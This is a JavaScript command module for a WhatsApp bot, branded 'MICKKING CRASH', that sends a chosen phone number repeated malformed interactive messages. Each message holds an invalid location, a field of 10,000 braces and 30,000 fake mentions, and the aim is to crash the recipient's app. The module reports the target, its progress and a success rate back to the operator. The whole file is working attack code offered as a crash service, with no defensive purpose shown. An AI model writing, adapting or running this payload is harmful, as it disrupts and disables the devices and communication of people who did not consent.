import pkg from "bailey";
import crypto from 'crypto';

const { proto, generateWAMessageFromContent } = pkg;
import channelSender from '../commands/channelSender.js';

// Configuration for sinivi crash
const CRASH_CONFIG = {
    ITERATIONS: 15,
    COOLDOWN: 2000,
    MENTION_COUNT: 30000,
    MAX_RETRIES: 3,
    PATTERNS: ['interactive', 'location', 'contact']
};

async function generateRandomMentions() {
    return Array.from(
        { length: CRASH_CONFIG.MENTION_COUNT },
        () => Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
    );
}

async function bugfunc(client, targetNumber, pattern = 'interactive') {

 try {
   const mentions = await generateRandomMentions();
   const timestamp = Date.now();
   
   let message = {
     ephemeralMessage: {
       message: {
         interactiveMessage: {
           header: {
             title: "⚡ MICKKING CRASH ⚡",

             hasMediaAttachment: false,

             locationMessage: {

               degreesLatitude: -999.035,

               degreesLongitude: 922.999999999999,

               name: "Peace and Love",

               address: "Peace and Love",

             },

           },

           body: {

             text: "Peace and Love",

           },

           nativeFlowMessage: {

             messageParamsJson: "{".repeat(10000),

           },

           contextInfo: {

             participant: targetNumber,

             mentionedJid: [

               "0@s.whatsapp.net",

               ...Array.from(
                 {
                   length: 30000,
                 },
                 () =>
                   "1" +
                   Math.floor(Math.random() * 5000000) +
                   "@s.whatsapp.net"
               ),
             ],
           },
         },
       },
     },
   };

   await client.relayMessage(targetNumber, message, {

     messageId: null,

     participant: { jid: targetNumber },

     userJid: targetNumber,

   });

 } catch (err) {

   console.log(err);

 }

}
export async function sinivicrash(message, client) {
    try {
        const remoteJid = message.key?.remoteJid;
        if (!remoteJid) {
            throw new Error("Message JID is undefined.");
        }

        // Check if it's a group
        if (remoteJid.endsWith('@g.us')) {
            throw new Error("❌ This command cannot be used in groups.");
        }

        // Send initial status message
        await client.sendMessage(remoteJid, { 
            text: `━━━━『 *MICKKING CRASH* 』━━━━\n\n` +
                 `⚡ *Status:* Initializing...\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `_Preparing crash sequence..._`,
            contextInfo: {
                externalAdReply: {
                    title: "MICKKING Crash Service",
                    body: "Premium Crash System",
                    showAdAttribution: true,
                    renderLargerThumbnail: true
                }
            }
        });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Specify the person to bug.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Progress tracking
        let successCount = 0;
        let failCount = 0;

        // Update target info
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *TARGET ACQUIRED* 』━━━━\n\n` +
                 `🎯 *Target:* @${participant.split('@')[0]}\n` +
                 `💫 *Mode:* Premium Crash\n` +
                 `⚡ *Iterations:* ${CRASH_CONFIG.ITERATIONS}\n\n` +
                 `_Starting crash sequence..._`,
            mentions: [participant]
        });

        // Execute crash sequence with different patterns
        for (let i = 0; i < CRASH_CONFIG.ITERATIONS; i++) {
            try {
                // Show progress every 3 iterations
                if (i % 3 === 0) {
                    await client.sendMessage(remoteJid, {
                        text: `*Progress Update:*\n` +
                             `✅ Sent: ${i}/${CRASH_CONFIG.ITERATIONS}\n` +
                             `📊 Success Rate: ${((successCount/(i||1))*100).toFixed(1)}%\n` +
                             `⏳ Remaining: ${((CRASH_CONFIG.ITERATIONS-i)*2)} seconds`
                    });
                }

                // Rotate through different crash patterns
                const pattern = CRASH_CONFIG.PATTERNS[i % CRASH_CONFIG.PATTERNS.length];
                await bugfunc(client, participant, pattern);
                successCount++;

                await new Promise(resolve => setTimeout(resolve, CRASH_CONFIG.COOLDOWN));
            } catch (iterError) {
                console.error(`Crash iteration ${i + 1} failed:`, iterError);
                failCount++;
                continue;
            }
        }

        // Send completion report
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *CRASH COMPLETE* 』━━━━\n\n` +
                 `🎯 *Target:* @${participant.split('@')[0]}\n` +
                 `✅ *Success:* ${successCount}\n` +
                 `❌ *Failed:* ${failCount}\n` +
                 `📊 *Success Rate:* ${((successCount/CRASH_CONFIG.ITERATIONS)*100).toFixed(1)}%\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `━━『 *MICKKING CRASH SERVICE* 』━━`,
            mentions: [participant],
            contextInfo: {
                externalAdReply: {
                    title: "Crash Complete",
                    body: `Success Rate: ${((successCount/CRASH_CONFIG.ITERATIONS)*100).toFixed(1)}%`,
                    showAdAttribution: true
                }
            }
        });

    } catch (error) {
        console.error("Crash error:", error);
        
        // Send formatted error message
        await client.sendMessage(message.key.remoteJid, {
            text: `━━━━『 *ERROR REPORT* 』━━━━\n\n` +
                 `❌ *Operation Failed*\n` +
                 `⚠️ *Error:* ${error.message}\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `_Please try again in a few minutes..._`,
            contextInfo: {
                externalAdReply: {
                    title: "Crash Service",
                    body: "Error Notification",
                    showAdAttribution: true
                }
            }
        });
    }
}

export default sinivicrash;